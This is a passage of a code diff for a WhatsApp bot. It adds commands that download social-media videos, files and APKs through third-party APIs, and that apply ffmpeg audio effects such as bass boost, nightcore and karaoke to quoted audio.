+          mimeType = 'image/png';
+          break;
+        case 'image/jpeg':
+          mimeType = 'image/jpeg';
+          break;
+        case 'application/pdf':
+          mimeType = 'application/pdf';
+          break;
+        case 'application/zip':
+          mimeType = 'application/zip';
+          break;
+        case 'video/mp4':
+          mimeType = 'video/mp4';
+          break;
+        case 'video/webm':
+          mimeType = 'video/webm';
+          break;
+        case 'application/vnd.android.package-archive':
+          mimeType = 'application/vnd.android.package-archive';
+          break;
+        default:
+          mimeType = 'application/octet-stream';
+      }
+
+      conn.sendMessage(m.chat, { document: buffer, mimetype: mimeType, fileName: filename }, { quoted: m });
+    } catch (error) {
+      reply(`Error downloading file: ${error.message}`);
+    }
+}
+break
+case "gdrive": {
+if (!text) return reply("*Please provide a Google Drive file URL*");
+
+    try {
+      let response = await fetch(`${global.mess.siputzx}/api/d/gdrive?url=${encodeURIComponent(text)}`);
+      let data = await response.json();
+
+      if (response.status !== 200 || !data.status || !data.data) {
+        return reply("*Please try again later or try another command!*");
+      } else {
+        const downloadUrl = data.data.download;
+        const filePath = path.join(__dirname, `${data.data.name}`);
+
+        const writer = fs.createWriteStream(filePath);
+        const fileResponse = await axios({
+          url: downloadUrl,
+          method: 'GET',
+          responseType: 'stream'
+        });
+
+        fileResponse.data.pipe(writer);
+
+        writer.on('finish', async () => {
+          await conn.sendMessage(m.chat, {
+            document: { url: filePath },
+            fileName: data.data.name,
+            mimetype: fileResponse.headers['content-type']
+          });
+
+          fs.unlinkSync(filePath);
+        });
+
+        writer.on('error', (err) => {
+          console.error('Error downloading the file:', err);
+          reply("An error occurred while downloading the file.");
+        });
+      }
+    } catch (error) {
+      console.error('Error fetching Google Drive file details:', error);
+      reply(mess.error);
+    }
+}
+break
+case "image":
+case "img":
+case "pinterest": {
+if (!text) return reply("*Please provide a search query*");
+
+    try {
+      let response = await fetch(`https://api.vreden.my.id/api/pinterest?query=${encodeURIComponent(text)}`);
+      let data = await response.json();
+
+      if (response.status !== 200 || !data.result || data.result.length === 0) {
+        return reply("*No images found or API error. Please try again later or try another query!*");
+      } else {
+        const images = data.result.slice(0, 5);
+
+        for (const imageUrl of images) {
+          await conn.sendMessage(m.chat, {
+            image: { url: imageUrl },
+            caption: `Search: ${text}`,
+          });
+          await new Promise(resolve => setTimeout(resolve, 500)); 
+        }
+      }
+    } catch (error) {
+      console.error('Error fetching images:', error);
+      reply(mess.error);
+    }
+}
+break
+case 'instagram':
+case 'ig':
+case 'igdl': {
+    const url = args[0];
+    if (!url) return reply(`*Please provide Instagram url!*`);
+
+    try {
+        await reply(`Fetching video...`);
+
+        const apiUrl = `https://apis.davidcyril.name.ng/instagram?url=${encodeURIComponent(url)}`;
+        const response = await axios.get(apiUrl);
+
+        if (!response.data?.success || !response.data?.result?.video) {
+            return reply(`Failed to fetch Instagram video.`);
+        }
+
+        const videoUrl = response.data.result.video;
+
+        await conn.sendMessage(m.chat, {
+            video: { url: videoUrl },
+            caption: `> ${global.wm}`
+        }, { quoted: m });
+
+    } catch (error) {
+        console.error('Instagram error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+   
+}
+break
+case 'gitclone': {
+if (!text) return reply("*Please provide gitHub repository link*")
+let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
+if (!regex.test(text)) return reply("*Invalid link*")
+try {
+    let [, user, repo] = args[0].match(regex) || []
+    repo = repo.replace(/.git$/, '')
+    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
+    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
+    conn.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
+} catch (e) {
+await reply(`*Error! Repository Not Found*`)
+}}
+break
+case 'mf':
+case 'mediafire': {
+    const url = args[0];
+    if (!url) return reply(`*Please provide mediafire url!*`);
+
+    try {
+        const apiUrl = `https://apis.davidcyril.name.ng/mediafire?url=${encodeURIComponent(url)}`;
+        const response = await axios.get(apiUrl);
+
+        if (!response.data?.downloadLink) {
+            return reply(`Failed to fetch file.`);
+        }
+
+        const { fileName, downloadLink, size } = response.data;
+
+        await conn.sendMessage(m.chat, {
+            document: { url: downloadLink },
+            fileName: fileName,
+            mimetype: 'application/octet-stream',
+            caption: `📁 ${fileName}\n📦 Size: ${size}`
+        }, { quoted: m });
+
+    } catch (error) {
+        console.error('MediaFire error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+   
+}
+break
+case "itunes": {
+if (!text) return reply("*Please provide a song name*");
+    
+    try {
+      let res = await fetch(`https://api.popcat.xyz/itunes?q=${encodeURIComponent(text)}`);
+      if (!res.ok) {
+        throw new Error(`*API request failed with status ${res.status}*`);
+      }
+      let json = await res.json();
+      let songInfo = `*Song Information:*\n
+ • *Name:* ${json.name}\n
+ • *Artist:* ${json.artist}\n
+ • *Album:* ${json.album}\n
+ • *Release Date:* ${json.release_date}\n
+ • *Price:* ${json.price}\n
+ • *Length:* ${json.length}\n
+ • *Genre:* ${json.genre}\n
+ • *URL:* ${json.url}`;
+     
+      if (json.thumbnail) {
+        await conn.sendMessage(
+          m.chat,
+          { image: { url: json.thumbnail }, caption: songInfo },
+          { quoted: m }
+        );
+      } else {
+        reply(songInfo);
+      }
+    } catch (error) {
+      console.error(error);
+      reply(mess.error);
+    }
+}
+break       
+case 'fb':
+case 'facebook': {
+    if (!text) return reply('*Please provide a Facebook URL*');
+        
+        await reply('📥 Downloading...');
+        
+        try {
+            // Use siputzx API
+            let res = await fetch(`https://api.siputzx.my.id/api/d/facebook?url=${encodeURIComponent(text)}`);
+            let data = await res.json();
+            
+            // Check if API returned success
+            if (!data.status || !data.data) {
+                return reply('Failed to fetch video. Check the URL and try again.');
+            }
+            
+            const videoData = data.data;
+            const downloads = videoData.downloads || [];
+            
+            let videoUrl = null;
+            
+            // Try to get HD (720p)
+            const hdVideo = downloads.find(d => d.quality === '720p (HD)' && d.type === 'video');
+            if (hdVideo) {
+                videoUrl = hdVideo.url;
+            } else {
+                // Fallback to SD (360p)
+                const sdVideo = downloads.find(d => d.quality === '360p (SD)' && d.type === 'video');
+                if (sdVideo) {
+                    videoUrl = sdVideo.url;
+                }
+            }
+            
+            if (!videoUrl) return reply('No video download link found');
+            
+            await conn.sendMessage(m.chat, {
+                video: { url: videoUrl },
+                caption: `${global.wm || ''}`,
+                contextInfo: { 
+                    externalAdReply: { 
+                        title: "Facebook Video",
+                        body: "Downloaded",
+                        thumbnailUrl: videoData.thumbnail || '',
+                        sourceUrl: text,
+                        mediaType: 1,
+                        renderLargerThumbnail: true
+                    } 
+                }
+            }, { quoted: m });
+            
+            await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
+            
+        } catch (error) {
+            console.error('Facebook error:', error);
+            reply(`❌ Error: ${error.message}`);
+            await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
+        }
+}
+break
+case 'capcut':
+case 'cc':
+case 'capcutdl':
+    if (!text) return reply("*Please provide a CapCut template URL.*`");
+    
+    try {
+        await reply("📥 Downloading CapCut template...");
+        
+        const response = await fetch(`${global.mess.siputzx}/api/d/capcut?url=${encodeURIComponent(text)}`);
+        const data = await response.json();
+        
+        if (!data.status || !data.data || !data.data.originalVideoUrl) {
+            return reply("*Failed to download CapCut template. Check the URL*.");
+        }
+        
+        const { title, originalVideoUrl, authorName } = data.data;
+        
+        await conn.sendMessage(m.chat, {
+            video: { url: originalVideoUrl },
+            caption: `📹 *CapCut Template*\n📝 ${title || 'No title'}\n👤 By: ${authorName || 'Unknown'}\n\n> ${global.wm || ''}`
+        }, { quoted: m });
+        
+        await conn.sendMessage(m.chat, { 
+            react: { text: "✅", key: m.key } 
+        });
+        
+    } catch (error) {
+        console.error('CapCut download error:', error);
+        reply("*Error downloading CapCut template. Try again later.*");
+        await conn.sendMessage(m.chat, { 
+            react: { text: "❌", key: m.key } 
+        });
+  }
+  
+break
+case 'twitter':
+case 'x': {
+    if (!text) return reply(`*Please provide Twitter link or url!*`);
+
+    try {
+        // React while processing
+        await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
+
+        // API URL
+        const apiUrl = `https://api.siputzx.my.id/api/d/twitter?url=${encodeURIComponent(text)}`;
+        
+        // Fetch response
+        const response = await fetch(apiUrl);
+        const data = await response.json();
+
+        if (data.status && data.data && data.data.downloadLink) {
+            // Send video
+            await conn.sendMessage(
+                m.chat,
+                {
+                    video: { url: data.data.downloadLink },
+                    mimetype: 'video/mp4',
+                    caption: `*${data.data.videoTitle || 'Twitter Video'}*\n\n${global.wm || ''}`
+                },
+                { quoted: m }
+            );
+            
+            // Success reaction
+            await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
+        } else {
+            throw new Error('No video found');
+        }
+        
+    } catch (error) {
+        console.error('Twitter command error:', error);
+        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
+        reply(mess.error);
+    }
+}
+break
+case 'tiktok':
+case 'tt': {
+    if (!text) return reply(conn, `Use: ${prefix + command} <tiktok_link>`, m)
+    
+    await reply(`Please wait ${global.botname} 💪 its fetching your video...`)
+    
+    
+    try {
+        let data = await fg.tiktok(text)
+        let json = data.result
+        let caption = `[ TIKTOK DOWNLOAD ]\n\n`
+        caption += `◦ *ID*: ${json.id}\n`
+        caption += `◦ *Username*: ${json.author?.nickname || 'N/A'}\n`
+        caption += `◦ *Title*: ${json.title || 'No title'}\n`
+        caption += `◦ *Likes*: ${json.digg_count || 0}\n`
+        caption += `◦ *Comments*: ${json.comment_count || 0}\n`
+        caption += `◦ *Shares*: ${json.share_count || 0}\n`
+        caption += `◦ *Plays*: ${json.play_count || 0}\n`
+        caption += `◦ *Created*: ${json.create_time || 'Unknown'}\n`
+        caption += `◦ *Size*: ${json.size || 'Unknown'}\n`
+        caption += `◦ *Duration*: ${json.duration || 'Unknown'} seconds`
+        
+        if (json.images) {
+            // Handle image slideshow
+            for (let imageUrl of json.images) {
+                await conn.sendMessage(m.chat, { 
+                    image: { url: imageUrl },
+                    caption: caption
+                }, { quoted: m })
+                await sleep(2000) // Delay between images
+            }
+        } else if (json.play) {
+            // Handle video
+            await conn.sendMessage(m.chat, { 
+                video: { url: json.play }, 
+                mimetype: 'video/mp4',
+                caption: caption
+            }, { quoted: m })
+            
+            // Send music separately if available
+            if (json.music) {
+                await sleep(3000)
+                await conn.sendMessage(m.chat, { 
+                    audio: { url: json.music },
+                    mimetype: 'audio/mpeg'
+                }, { quoted: m })
+            }
+        } else {
+            await reply(bot, 'Failed to download TikTok content. The link might be invalid or private.', m)
+        }
+    } catch (error) {
+        console.error('TikTok Error:', error)
+        await reply(bot, 'Error downloading TikTok content. Please try again later or check the link.', m)
+    }
+}
+break
+case "tiktok2": {
+if (!args[0]) return reply('*Please provide a TikTok video url!*');
+    
+    try {
+      let apiUrl = await fetchJson(`https://api-aswin-sparky.koyeb.app/api/downloader/tiktok?url=${args[0]}`);
+      
+      await conn.sendMessage(
+        m.chat,
+        {
+          caption: global.wm,
+          video: { url: apiUrl.data.video },
+          fileName: "video.mp4",
+          mimetype: "video/mp4",
+        },
+        { quoted: m }
+      );
+    } catch (error) {
+      reply(mess.error);
+    }
+}
+break 
+case 'tiktoksearch':
+case 'tts': {
+    const query = args.join(" "); 
+        if (!query) return reply("*Please provide a search term. Example: `.tiktoksearch keizzah4189*`");
+    
+    try {
+      const response = await fetch(`${global.api}/search/tiktoksearch?query=${encodeURIComponent(query)}`);
+      const data = await response.json();
+      
+      if (!data.status || !data.result?.length) {
+        return reply(`❌ No TikTok videos found for "${query}"`);
+      }
+      
+      let message = `*TikTok Search Results for "${query}"*\n\n`;
+      message += `*📊 Found:* ${data.result.length} videos\n\n`;
+      
+      data.result.slice(0, 5).forEach((video, i) => {
+        message += `*${i + 1}. Video*\n`;
+        message += `👤 *Author:* ${video.author?.nickname || 'Unknown'}\n`;
+        message += `🌍 *Region:* ${video.region || 'N/A'}\n`;
+        message += `⏱️ *Duration:* ${video.duration || 0} seconds\n`;
+        if (video.title) message += `📝 *Title:* ${video.title.substring(0, 50)}${video.title.length > 50 ? '...' : ''}\n`;
+        message += `🎬 *Watch:* ${video.play}\n`;
+        if (video.music) message += `🎵 *Audio:* ${video.music}\n`;
+        message += `\n`;
+      });
+      
+      message += `\n_Showing top 5 results. Use .ttdl [video_url] to download._`;
+      
+      reply(message);
+    } catch (error) {
+      console.error('TikTok Search Error:', error);
+      reply("❌ Error searching TikTok. Try again later.");
+    }
+}
+break
+case "tiktokaudio": {
+if (!args[0]) return reply('*Please provide a TikTok audio url!*');
+    
+    try {
+      let apiUrl = await fetchJson(`https://api-aswin-sparky.koyeb.app/api/downloader/tiktok?url=${args[0]}`);
+      
+      await conn.sendMessage(
+        m.chat,
+        {
+          audio: { url: apiUrl.data.audio },
+          fileName: "tiktok.mp3",
+          mimetype: "audio/mpeg",
+        },
+        { quoted: m }
+      );
+    } catch (error) {
+      reply(global.mess.error);
+    }
+}
+break
+case 'apkdl': 
+case 'apk': {
+    const appName = args.join(' ');
+    
+    if (!appName) {
+        return reply("*Please provide an app name.\n\nExample: .apk whatsapp*");
+    }
+    
+    try {
+        await conn.sendPresenceUpdate('composing', from);
+        
+        const apiUrl = `https://api.princetechn.com/api/download/apkdl?apikey=prince&appName=${encodeURIComponent(appName)}`;
+        const { data } = await axios.get(apiUrl, { timeout: 15000 });
+        
+        if (data && data.success && data.result) {
+            const result = data.result;
+            const apkUrl = result.download_url;
+            
+            await conn.sendMessage(from, { 
+                document: { url: apkUrl },
+                mimetype: 'application/vnd.android.package-archive',
+                fileName: `${result.appname}.apk`,
+                caption: `📱 *${result.appname}*\n👨‍💻 Developer: ${result.developer}`
+            }, { quoted: m });
+        } else {
+            reply(`APK for "${appName}" not found.`);
+        }
+    } catch (error) {
+        console.error('APK error:', error.message);
+        reply("Error fetching APK. Please try again later!");
+    }
+    
+}
+break
+case 'bass': {
+  try {
+    const quoted = m.quoted ? m.quoted : null;
+    const mime = quoted?.mimetype || "";
+
+    if (!quoted || !/audio/.test(mime)) {
+      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
+    }
+
+    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
+    const outputPath = getRandom('.mp3');
+
+    exec(`ffmpeg -i ${mediaPath} -af equalizer=f=54:width_type=o:width=2:g=20 ${outputPath}`, (error) => {
+      fs.unlinkSync(mediaPath);
+      if (error) return reply(error.toString());
+
+      const audioBuffer = fs.readFileSync(outputPath);
+      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
+      fs.unlinkSync(outputPath);
+    });
+  } catch (err) {
+    reply(err.toString());
+  }
+  break;
+}
+case "blown": {
+  try {
+  const quoted = m.quoted ? m. 
+  quoted : null;
+  const mime = quoted?.
+  mimetype || "";
+  if (!quoted || !/audio/.test(mime)) {
+    return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
+    }
+
+    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
+    const outputPath = getRandom('.mp3');
+
+    // Different filter for treble
+    exec(`ffmpeg -i ${mediaPath} -af atempo=4/4,asetrate=44500*2/3 ${outputPath}`, (error) => {
+      fs.unlinkSync(mediaPath);
+      if (error) return reply(error.toString());
+
+      const audioBuffer = fs.readFileSync(outputPath);
+      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
+      fs.unlinkSync(outputPath);
+    });
+  } catch (err) {
+    reply(err.toString());
+  }
+  
+}
+break
+case 'earrape': {
+try {
+    const quoted = m.quoted ? m.quoted : null;
+    const mime = quoted?.mimetype || "";
+
+    if (!quoted || !/audio/.test(mime)) {
+      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
+    }
+
+    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
+    const outputPath = getRandom('.mp3');
+
+    // Different filter for treble
+    exec(`ffmpeg -i ${mediaPath} -af volume=12 ${outputPath}`, (error) => {
+      fs.unlinkSync(mediaPath);
+      if (error) return reply(error.toString());
+
+      const audioBuffer = fs.readFileSync(outputPath);
+      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
+      fs.unlinkSync(outputPath);
+    });
+  } catch (err) {
+    reply(err.toString());
+  }
+  
+}
+break
+case "volaudio": {
+  try {
+    const quoted = m.quoted ? m.quoted : null;
+    const mime = quoted?.mimetype || "";
+
+    if (!quoted || !/audio/.test(mime)) {
+      return reply(`Reply to an *audio file* with *${prefix + command}* to adjust volume.`);
+    }
+
+    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
+    const outputPath = getRandom('.mp3');
+
+    // Different filter for treble
+    exec(`ffmpeg -i ${mediaPath} -filter:a volume= ${outputPath}`, (error) => {
+      fs.unlinkSync(mediaPath);
+      if (error) return reply(error.toString());
+
+      const audioBuffer = fs.readFileSync(outputPath);
+      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
+      fs.unlinkSync(outputPath);
+    });
+  } catch (err) {
+    reply(err.toString());
+  }
+  
+}
+case 'treble': {
+  try {
+    const quoted = m.quoted ? m.quoted : null;
+    const mime = quoted?.mimetype || "";
+
+    if (!quoted || !/audio/.test(mime)) {
+      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
+    }
+
+    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
+    const outputPath = getRandom('.mp3');
+
+    // Different filter for treble
+    exec(`ffmpeg -i ${mediaPath} -af equalizer=f=10000:width_type=o:width=2:g=15 ${outputPath}`, (error) => {
+      fs.unlinkSync(mediaPath);
+      if (error) return reply(error.toString());
+
+      const audioBuffer = fs.readFileSync(outputPath);
+      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
+      fs.unlinkSync(outputPath);
+    });
+  } catch (err) {
+    reply(err.toString());
+  }
+  
+}
+break
+case 'fast': {
+  try {
+    const quoted = m.quoted ? m.quoted : null;
+    const mime = quoted?.mimetype || "";
+
+    if (!quoted || !/audio/.test(mime)) {
+      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
+    }
+
+    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
+    const outputPath = getRandom('.mp3');
+
+    exec(`ffmpeg -i ${mediaPath} -filter:a "atempo=1.5" ${outputPath}`, (error) => {
+      fs.unlinkSync(mediaPath);
+      if (error) return reply(error.toString());
+
+      const audioBuffer = fs.readFileSync(outputPath);
+      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
+      fs.unlinkSync(outputPath);
+    });
+  } catch (err) {
+    reply(err.toString());
+  }
+  break;
+}
+case 'slow': {
+  try {
+    const quoted = m.quoted ? m.quoted : null;
+    const mime = quoted?.mimetype || "";
+
+    if (!quoted || !/audio/.test(mime)) {
+      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
+    }
+
+    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
+    const outputPath = getRandom('.mp3');
+
+    // Different filter for treble
+    exec(`ffmpeg -i ${mediaPath}  -filter:a "atempo=0.8 ${outputPath}`, (error) => {
+      fs.unlinkSync(mediaPath);
+      if (error) return reply(error.toString());
+
+      const audioBuffer = fs.readFileSync(outputPath);
+      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
+      fs.unlinkSync(outputPath);
+    });
+  } catch (err) {
+    reply(err.toString());
+  }
+  
+}
+break
+case 'reverse': {
+  try {
+    const quoted = m.quoted ? m.quoted : null;
+    const mime = quoted?.mimetype || "";
+
+    if (!quoted || !/audio/.test(mime)) {
+      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
+    }
+
+    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
+    const outputPath = getRandom('.mp3');
+
+    exec(`ffmpeg -i ${mediaPath} -filter_complex "areverse" ${outputPath}`, (error) => {
+      fs.unlinkSync(mediaPath);
+      if (error) return reply(error.toString());
+
+      const audioBuffer = fs.readFileSync(outputPath);
+      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
+      fs.unlinkSync(outputPath);
+    });
+  } catch (err) {
+    reply(err.toString());
+  }
+  break;
+}
+case 'echo': {
+  try {
+    const quoted = m.quoted ? m.quoted : null;
+    const mime = quoted?.mimetype || "";
+
+    if (!quoted || !/audio/.test(mime)) {
+      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
+    }
+
+    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
+    const outputPath = getRandom('.mp3');
+
+    exec(`ffmpeg -i ${mediaPath} -filter:a "aecho=0.8:0.9:1000:0.3" ${outputPath}`, (error) => {
+      fs.unlinkSync(mediaPath);
+      if (error) return reply(error.toString());
+
+      const audioBuffer = fs.readFileSync(outputPath);
+      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
+      fs.unlinkSync(outputPath);
+    });
+  } catch (err) {
+    reply(err.toString());
+  }
+  break;
+}
+
+case 'robot': {
+  try {
+    const quoted = m.quoted ? m.quoted : null;
+    const mime = quoted?.mimetype || "";
+
+    if (!quoted || !/audio/.test(mime)) {
+      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
+    }
+
+    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
+    const outputPath = getRandom('.mp3');
+
+    exec(`ffmpeg -i ${mediaPath} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${outputPath}`, (error) => {
+      fs.unlinkSync(mediaPath);
+      if (error) return reply(error.toString());
+
+      const audioBuffer = fs.readFileSync(outputPath);
+      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
+      fs.unlinkSync(outputPath);
+    });
+  } catch (err) {
+    reply(err.toString());
+  }
+  break;
+}
+case 'deep': {
+  try {
+    const quoted = m.quoted ? m.quoted : null;
+    const mime = quoted?.mimetype || "";
+
+    if (!quoted || !/audio/.test(mime)) {
+      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
+    }
+
+    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
+    const outputPath = getRandom('.mp3');
+
+    exec(`ffmpeg -i ${mediaPath} -filter:a "asetrate=44100*0.7,aresample=44100" ${outputPath}`, (error) => {
+      fs.unlinkSync(mediaPath);
+      if (error) return reply(error.toString());
+
+      const audioBuffer = fs.readFileSync(outputPath);
+      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
+      fs.unlinkSync(outputPath);
+    });
+  } catch (err) {
+    reply(err.toString());
+  }
+  break;
+}
+case 'chipmunk': {
+  try {
+    const quoted = m.quoted ? m.quoted : null;
+    const mime = quoted?.mimetype || "";
+
+    if (!quoted || !/audio/.test(mime)) {
+      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
+    }
+
+    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
+    const outputPath = getRandom('.mp3');
+
+    exec(`ffmpeg -i ${mediaPath} -filter:a "asetrate=44100*1.5,aresample=44100" ${outputPath}`, (error) => {
+      fs.unlinkSync(mediaPath);
+      if (error) return reply(error.toString());
+
+      const audioBuffer = fs.readFileSync(outputPath);
+      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
+      fs.unlinkSync(outputPath);
+    });
+  } catch (err) {
+    reply(err.toString());
+  }
+  break;
+}
+case 'nightcore': {
+  try {
+    const quoted = m.quoted ? m.quoted : null;
+    const mime = quoted?.mimetype || "";
+
+    if (!quoted || !/audio/.test(mime)) {
+      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
+    }
+
+    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
+    const outputPath = getRandom('.mp3');
+
+    exec(`ffmpeg -i ${mediaPath} -filter:a "atempo=1.06,asetrate=44100*1.25" ${outputPath}`, (error) => {
+      fs.unlinkSync(mediaPath);
+      if (error) return reply(error.toString());
+
+      const audioBuffer = fs.readFileSync(outputPath);
+      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
+      fs.unlinkSync(outputPath);
+    });
+  } catch (err) {
+    reply(err.toString());
+  }
+  break;
+}
+case 'instrumental': {
+  try {
+    const quoted = m.quoted ? m.quoted : null;
+    const mime = quoted?.mimetype || "";
+
+    if (!quoted || !/audio/.test(mime)) {
+      return reply(`Reply to an *audio file* with *${prefix + command}* to extract instrumental.`);
+    }
+
+    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
+    const outputPath = getRandom('.mp3');
+
+    // Using the karaoke filter to remove vocals (center channel removal)
+    exec(`ffmpeg -i ${mediaPath} -af "pan=stereo|c0=c0|c1=c1,aresample=async=1:first_pts=0" ${outputPath}`, (error) => {
+      fs.unlinkSync(mediaPath);
+      if (error) return reply(error.toString());
+
+      const audioBuffer = fs.readFileSync(outputPath);
+      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
+      fs.unlinkSync(outputPath);
+    });
+  } catch (err) {
+    reply(err.toString());
+  }
+  break;
+}
+case 'vocalremove': {
+  try {
+    const quoted = m.quoted ? m.quoted : null;
+    const mime = quoted?.mimetype || "";
+
+    if (!quoted || !/audio/.test(mime)) {
+      return reply(`Reply to an *audio file* with *${prefix + command}* to remove vocals.`);
+    }
+
+    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
+    const outputPath = getRandom('.mp3');
+
+    // More advanced vocal removal technique
+    exec(`ffmpeg -i ${mediaPath} -af "pan=stereo|c0=c0|c1=-1*c1" ${outputPath}`, (error) => {
+      fs.unlinkSync(mediaPath);
+      if (error) return reply(error.toString());
+
+      const audioBuffer = fs.readFileSync(outputPath);
+      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
+      fs.unlinkSync(outputPath);
+    });
+  } catch (err) {
+    reply(err.toString());
+  }
+  break;
+}
+case 'karaoke': {
+  try {
+    const quoted = m.quoted ? m.quoted : null;
+    const mime = quoted?.mimetype || "";
+
+    if (!quoted || !/audio/.test(mime)) {
+      return reply(`Reply to an *audio file* with *${prefix + command}* to create karaoke version.`);
+    }
+
+    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
+    const outputPath = getRandom('.mp3');
+
+    // Different approach to vocal removal
+    exec(`ffmpeg -i ${mediaPath} -af "stereotools=mode=ms>lr" ${outputPath}`, (error) => {
+      fs.unlinkSync(mediaPath);
+      if (error) return reply(error.toString());
+
+      const audioBuffer = fs.readFileSync(outputPath);
+      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
+      fs.unlinkSync(outputPath);
+    });
+  } catch (err) {
+    reply(err.toString());
+  }
+  break;
+}
+case 'wallpaper':
+case 'wall': { 
+const query = args.join(" ");
+    if (!query) {
+        return reply("Please provide a search query.\n\nExample: .wallpaper Sunset Scenes");
+    }
+    
+    try {
+        await conn.sendPresenceUpdate('composing', from);
+        
+        const apiUrl = `https://api.princetechn.com/api/search/wallpaper?apikey=prince&query=${encodeURIComponent(query)}`;
+        const { data } = await axios.get(apiUrl, { timeout: 15000 });
+        
+        if (data && data.success && data.results && data.results.length > 0) {
+            const randomIndex = Math.floor(Math.random() * data.results.length);
+            const wallpaper = data.results[randomIndex];
+            const imageUrl = wallpaper.image[0];
+            
+            const caption = `🖼️ *Wallpaper*\n\n📌 *Type:* ${wallpaper.type}\n🔍 *Search:* ${query}`;
+            
+            await conn.sendMessage(from, {
+                image: { url: imageUrl },
+                caption: caption
+            }, { quoted: m });
+        } else {
+            reply(`❌ No wallpapers found for "${query}".`);
+        }
+    } catch (error) {
+        console.error('Wallpaper error:', error.message);
+        reply("❌ Error fetching wallpaper. Please try again later!");
+    }
+    
+}
+break
+case "wikipedia":
+case "wiki": {    
+    if (!text) return reply("📌 *Enter a search query.*\n\nExample: .wikipedia Elon Musk");
+
+    try {
+        const apiUrl = `https://api.princetechn.com/api/search/wikimedia?apikey=prince&title=${encodeURIComponent(text)}`;
+        const { data } = await axios.get(apiUrl, { timeout: 15000 });
+        
+        if (data && data.success && data.results) {
+            const result = data.results;
+            const imageUrl = result.originalImage?.source || result.thumbnail?.source;
+            
+            const caption = `📌 *Title:* ${result.title}\n\n📝 *Description:* ${result.description || 'No description available'}\n\n📖 *Extract:* ${result.extract || 'No extract available'}\n\n🔗 *Source:* ${result.pageUrl}\n📅 *Last Modified:* ${result.lastModified || 'Unknown'}`;
+            
+            if (imageUrl) {
+                await conn.sendMessage(m.chat, {
+                    image: { url: imageUrl },
+                    caption: caption
+                }, { quoted: m });
+            } else {
+                reply(caption);
+            }
+        } else {
+            reply(`❌ *No Wikipedia results found for "${text}".*`);
+        }
+    } catch (error) {
+        console.error('Wikipedia error:', error.message);
+        reply("❌ *An error occurred while fetching Wikipedia results.*");
+    }
+    
+}
+break
+case "remini": {
+    const quoted = m.quoted ? m.quoted : null;
+    const mime = quoted?.mimetype || "";
+
+    if (!quoted) return reply("📌 *Send or reply to an image.*");
+    if (!/image/.test(mime)) return reply(`📌 *Send or reply to an image with caption:* ${prefix + command}`);
+
+    try {
+        await reply("*Enhancing image... Please wait.*");
+        const imageUrl = await handleMediaUpload(quoted, conn, mime);
+        
+        if (!imageUrl || imageUrl.includes('exceeds the limit')) {
+            return reply("*Failed to upload image. Try again.*");
+        }
+        
